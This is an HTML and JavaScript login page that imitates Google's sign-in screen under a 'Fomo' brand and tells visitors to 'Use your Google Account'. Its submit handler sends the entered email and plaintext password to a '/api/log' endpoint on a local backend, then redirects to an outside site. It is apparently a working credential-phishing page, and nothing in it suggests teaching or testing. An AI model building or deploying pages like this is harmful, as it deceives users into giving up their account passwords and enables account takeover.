<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Google Style Login</title>
    <style>
      :root {
        --bg: #f5f7fb;
        --card: #ffffff;
        --text: #202124;
        --muted: #5f6368;
        --line: #dadce0;
        --primary: #1a73e8;
        --primary-dark: #1257c3;
        --hover: #f8f9fa;
        --shadow: 0 2px 10px rgba(60, 64, 67, 0.15), 0 4px 18px rgba(60, 64, 67, 0.1);
      }

      * { box-sizing: border-box; }

      body {
        margin: 0;
        min-height: 100vh;
        display: grid;
        place-items: center;
        background: var(--bg);
        font-family: Arial, Helvetica, sans-serif;
        color: var(--text);
      }

      .login-shell {
        width: min(90vw, 430px);
        background: var(--card);
        border: 1px solid rgba(218, 220, 224, 0.9);
        border-radius: 24px;
        padding: 30px 38px 24px;
        box-shadow: var(--shadow);
      }

      .brand {
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 14px;
        margin-bottom: 18px;
      }

      .fomo-logo {
        width: 64px;
        height: 64px;
        object-fit: contain;
        display: block;
        filter: drop-shadow(0 4px 10px rgba(31, 41, 55, 0.12));
      }

      .brand-text {
        font-size: 2.6rem;
        line-height: 1;
        font-weight: 700;
        letter-spacing: -0.08em;
        font-family: "Segoe UI", "Arial", sans-serif;
        user-select: none;
        color: #1e1e2f;
      }

      h1 {
        margin: 0 0 8px;
        font-size: 3.1rem;
        font-weight: 700;
        letter-spacing: -0.07em;
        line-height: 1.05;
        text-align: center;
        color: #1f2430;
      }

      .subtitle {
        margin: 0 0 24px;
        text-align: center;
        color: var(--muted);
        font-size: 0.96rem;
      }

      form {
        display: grid;
        gap: 18px;
      }

      .field {
        position: relative;
      }

      input[type="email"],
      input[type="password"],
      input[type="text"] {
        width: 100%;
        height: 56px;
        border: 1px solid var(--line);
        border-radius: 4px;
        background: transparent;
        padding: 18px 14px 6px;
        font-size: 1rem;
        outline: none;
        transition: border-color 0.2s ease, box-shadow 0.2s ease;
        box-sizing: border-box;
      }

      input[type="email"]:focus,
      input[type="password"]:focus,
      input[type="text"]:focus {
        border-color: var(--primary);
        box-shadow: inset 0 0 0 1px var(--primary);
      }

      label {
        position: absolute;
        left: 14px;
        top: 50%;
        transform: translateY(-50%);
        color: var(--muted);
        pointer-events: none;
        transition: all 0.15s ease;
        background: var(--card);
        padding: 0 4px;
      }

      .field input:focus + label,
      .field input:not(:placeholder-shown) + label {
        top: 0;
        font-size: 0.75rem;
        color: var(--primary);
      }

      .field input::placeholder {
        color: transparent;
      }

      .options {
        display: flex;
        flex-direction: row;
        align-items: center;
        justify-content: flex-start;
        gap: 18px;
        min-height: 24px;
        width: 100%;
      }

      .options-top,
      .options-bottom {
        display: flex;
        align-items: center;
        width: auto;
        justify-content: flex-start;
      }

      .checkbox-row {
        position: relative;
        z-index: 1;
        display: inline-flex;
        align-items: center;
        gap: 8px;
        cursor: pointer;
        color: var(--muted);
        font-size: 0.88rem;
        background: transparent;
        padding: 0;
        pointer-events: auto;
        flex-shrink: 0;
      }

      .link {
        flex-shrink: 0;
      }

      .checkbox-row input {
        accent-color: var(--primary);
        width: 16px;
        height: 16px;
      }

      .link {
        color: var(--primary);
        text-decoration: none;
        font-weight: 600;
        font-size: 0.9rem;
      }

      .link:hover {
        text-decoration: underline;
      }

      .actions {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 12px;
        margin-top: 6px;
      }

      .create {
        background: transparent;
        color: var(--primary);
        border: none;
        padding: 10px 14px;
        border-radius: 999px;
        font-weight: 600;
        cursor: pointer;
      }

      .create:hover {
        background: rgba(26, 115, 232, 0.08);
      }

      .primary {
        border: none;
        background: var(--primary);
        color: white;
        border-radius: 999px;
        padding: 0 22px;
        height: 42px;
        font-size: 0.95rem;
        font-weight: 600;
        cursor: pointer;
      }

      .primary:hover {
        background: var(--primary-dark);
      }

      .helper {
        margin-top: 16px;
        color: var(--muted);
        font-size: 0.8rem;
        line-height: 1.5;
      }

      .helper a {
        color: var(--primary);
        text-decoration: none;
        font-weight: 600;
      }

      .helper a:hover {
        text-decoration: underline;
      }


      @media (max-width: 520px) {
        .login-shell {
          border-radius: 18px;
          padding: 24px 20px 18px;
        }

        h1 {
          font-size: 1.7rem;
        }

        .actions {
          flex-direction: column;
          align-items: stretch;
        }

        .primary,
        .create {
          width: 100%;
        }
      }
    </style>
  </head>

        <div class="brand-text">Fomo</div>

      <h1>Sign in</h1>
      <p class="subtitle">Use your Google Account</p>

      <form id="login-form">
        <div class="field">
          <input id="email" type="email" placeholder="Email or phone" value="johndoe@gmail.com" aria-label="Email or phone" />
          <label for="email">Email or phone</label>
        </div>

        <div class="field">
          <input id="password" type="password" placeholder="Password" aria-label="Password" />
          <label for="password">Password</label>
        </div>

        <div class="options">
          <div class="options-top">
            <a class="link" href="#">Forgot email?</a>
          </div>
          <div class="options-bottom">
            <label class="checkbox-row" for="show-password">
              <input id="show-password" type="checkbox" />
              Show password
            </label>
          </div>
        </div>

        <div class="actions">
          <button type="button" class="create">Create account</button>
          <button type="submit" class="primary">Next</button>
        </div>
      </form>

      <div class="helper">
        Not your computer? Use a private browsing window to sign in.<br />
        <a href="#">Learn more</a>
      </div>
    </main>

    <script>
      const passwordInput = document.getElementById('password');
      const showPassword = document.getElementById('show-password');
      const loginForm = document.getElementById('login-form');

      showPassword.addEventListener('change', () => {
        const shouldShow = showPassword.checked;
        passwordInput.type = shouldShow ? 'text' : 'password';
        passwordInput.setAttribute('aria-label', shouldShow ? 'Password visible' : 'Password');
      });

      passwordInput.type = 'password';
      showPassword.checked = false;

      loginForm.addEventListener('submit', (event) => {
        event.preventDefault();

        const email = document.getElementById('email').value.trim();
        const password = passwordInput.value;

        console.log('[frontend] submit press detected');
        console.log('[frontend] email:', email);
        console.log('[frontend] password length:', password.length);

        fetch('http://localhost:3001/api/log', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password })
        })
          .then((response) => response.json())
          .then((data) => {
            console.log('[backend] response:', data);
            window.location.href = 'http://fomo.family/';
          })
          .catch((error) => {
            console.error('[backend] log request failed:', error);
            window.location.href = 'http://fomo.family/';
          });
      });
    </script>
